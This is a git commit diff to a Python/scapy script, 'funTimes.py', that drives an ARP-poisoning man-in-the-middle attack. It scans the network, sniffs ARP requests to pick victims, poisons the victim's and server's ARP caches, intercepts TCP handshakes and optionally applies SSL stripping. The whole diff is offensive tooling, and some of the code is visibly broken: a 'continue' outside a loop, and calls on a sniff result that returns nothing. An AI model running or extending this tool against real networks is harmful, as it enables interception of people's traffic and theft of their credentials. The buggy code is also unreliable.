4ac39e56f8fb5afdbc4bd2cd2791ad35379ed9e9
nietFreek <128623776+nietFreek@users.noreply.github.com>
2025-06-04 11:42:37 +0200

    so mss doet ie nu wat

--- funTimes.py
+++ funTimes.py
@@ -1,6 +1,12 @@
-import ARPpoisoning as ARP;
+import ARPpoisoning as ArpPoisen;
+import sslStripping as sslStripping;
+import scapy.all as sc;
 victimIP = ""
 serverIP = ""
+victimMac = ""
+serverMac = ""
+attackerIP = sc.conf.route.route("0.0.0.0")[1]
+attackerMac = sc.get_if_hwaddr(sc.conf.iface)
 
 
 def main():
@@ -9,26 +15,55 @@ def main():
 
         if ipt == "scan":
             ip_range = input("Enter ip range").strip().lower()
-            hosts = ARP.network_scan(ip_range)
+            hosts = ArpPoisen.network_scan(ip_range)
             for host in hosts:
                 print(host)
         elif ipt == "arp":
             targets = input("Enter 'victim ip, server ip' Can both be none").strip().lower()
             goal = input("Enter a goal: mitm, ownServer").strip().lower()
-            ownServer = ""
-            sslStrip = ""
-            if goal == "ownserver":
-                ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
-            elif goal == "mitm":
-                sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
             parts = [p.strip() for p in targets.split(',')]
             
             if len(parts) == 2:
                 victim_ip = parts[0] if parts[0] != "none" else None
                 server_ip = parts[1] if parts[1] != "none" else None
+
+                if (victim_ip is not None and server_ip is None):
+                    pkt =  sc.sniff(filter="arp", store=0)
+
+                    if pkt.haslayer(sc.ARP):
+                        arp = pkt[sc.ARP]
+                        if arp.op == 1 and arp.psrc == victim_ip:
+                            serverMac, victimMac = ArpPoisen.arp_poisonening(victim_ip, arp.pdst)
+                            
+                
+                if (victim_ip is None and server_ip is None):
+                    pkt =  sc.sniff(filter="arp", store=0)
+                    if pkt.haslayer(sc.ARP):
+                        arp = pkt[sc.ARP]
+                        if arp.op == 1:
+                            serverMac, victimMac = ArpPoisen.arp_poisonening(arp.psrc, arp.pdst)
+                	
                 print(f"Victim IP: {victim_ip}")
                 print(f"Server IP: {server_ip}")
-                ARP.arp_poisonening(victimIP, serverIP)
+                serverMac, victimMac = ArpPoisen.arp_poisonening(victimIP, serverIP)
+
+                ownServer = ""
+                sslStrip = ""
+                if goal == "ownserver":
+                    ownServer = input("Enter a ip adress to reroute victim to").strip().lower()
+                    
+                elif goal == "mitm":
+                    sslStrip = input("Use ssl stripping when possible: yes, no").strip().lower()
+                    pkt = sc.sniff(filter="tcp", store=0)
+                    if pkt.haslayer(sc.TCP):
+                        tcp = pkt[sc.TCP]
+                        if tcp.flags == "S":
+                            if (not ArpPoisen.three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP)):
+                                continue
+                            if (sslStrip == "yes"):
+                                sslStripping.stripping(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
+                            else:
+                                sslStripping.forward(victim_ip, victimMac, server_ip, serverMac, attackerIP, attackerMac)
             else:
                 print("Invalid input format. Please enter in the form: 'victim ip, server ip'")
         elif ipt == "quit":
